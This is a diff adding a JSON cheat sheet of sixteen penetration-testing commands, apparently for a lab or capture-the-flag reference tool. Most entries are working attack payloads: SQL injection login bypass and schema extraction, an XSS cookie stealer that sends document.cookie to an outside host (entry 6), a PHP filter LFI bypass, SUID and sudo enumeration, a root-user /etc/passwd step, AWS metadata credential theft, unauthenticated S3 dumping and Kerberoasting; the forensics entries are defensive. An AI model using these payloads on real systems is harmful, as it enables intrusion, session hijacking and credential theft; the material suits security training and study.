@@ -1,0 +1,18 @@
+[
+  { "id": "1", "category": "Recon", "title": "Nmap Fast SYN Scan", "description": "Quickly probe top 1000 ports with SYN packets without completing handshake.", "code": "nmap -sS -T4 10.10.14.88" },
+  { "id": "2", "category": "Recon", "title": "Nmap Aggressive & Script Scan", "description": "Aggressive OS detection, version detection, script scanning, and traceroute.", "code": "nmap -A -v -T4 10.10.14.88" },
+  { "id": "3", "category": "Recon", "title": "Nmap UDP Scan", "description": "Scan top UDP ports like DNS, SNMP, DHCP.", "code": "nmap -sU --top-ports 50 10.10.14.88" },
+  { "id": "4", "category": "Web Security", "title": "SQLi Basic Authentication Bypass", "description": "Standard Boolean SQL injection authentication bypass.", "code": "' OR '1'='1' -- -" },
+  { "id": "5", "category": "Web Security", "title": "SQLi Union Extraction Schema", "description": "Retrieve table names from SQLite schema database.", "code": "' UNION SELECT 1, sql, null FROM sqlite_master WHERE type='table'--" },
+  { "id": "6", "category": "Web Security", "title": "Cross-Site Scripting (XSS) Cookie Stealer", "description": "Extracts document cookies via fetch webhook.", "code": "<script>fetch('http://10.10.14.2:8000/?c='+document.cookie)</script>" },
+  { "id": "7", "category": "Web Security", "title": "Local File Inclusion (LFI) Filter Bypass", "description": "Base64 encode PHP source files for download.", "code": "php://filter/convert.base64-encode/resource=index.php" },
+  { "id": "8", "category": "PrivEsc", "title": "Find SUID Root Binaries", "description": "Locate files owned by root with SUID execution permissions.", "code": "find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;" },
+  { "id": "9", "category": "PrivEsc", "title": "Sudo Permission Listing", "description": "Verify current user execution rights under sudo configuration.", "code": "sudo -l" },
+  { "id": "10", "category": "PrivEsc", "title": "Writable /etc/passwd Exploit", "description": "Generate SHA-512 password hash to add root user.", "code": "openssl passwd -6 -salt root password123" },
+  { "id": "11", "category": "Forensics", "title": "Volatility 3 Active Process Tree", "description": "Display hierarchical parent-child process tree from RAM dump.", "code": "vol -f mem.raw windows.pstree" },
+  { "id": "12", "category": "Forensics", "title": "Volatility 3 Malware Injection Scan", "description": "Detect memory regions with EXECUTE_READWRITE and injected code.", "code": "vol -f mem.raw windows.malfind" },
+  { "id": "13", "category": "Forensics", "title": "Windows Prefetch Extraction", "description": "Extract execution timestamps from prefetch files.", "code": "PECmd.exe -d C:\\Windows\\Prefetch --csv ./output" },
+  { "id": "14", "category": "Cloud Security", "title": "AWS IMDSv1 Metadata Extraction", "description": "Query IAM credentials from EC2 metadata service.", "code": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
+  { "id": "15", "category": "Cloud Security", "title": "Public S3 Bucket Sync", "description": "Sync bucket contents without AWS credentials.", "code": "aws s3 sync s3://target-bucket ./dump --no-sign-request" },
+  { "id": "16", "category": "Active Directory", "title": "Kerberoasting Ticket Extraction", "description": "Request TGS tickets for offline cracking with Hashcat.", "code": "GetUserSPNs.py corp.local/user:password -request -dc-ip 10.10.14.102" }
+]
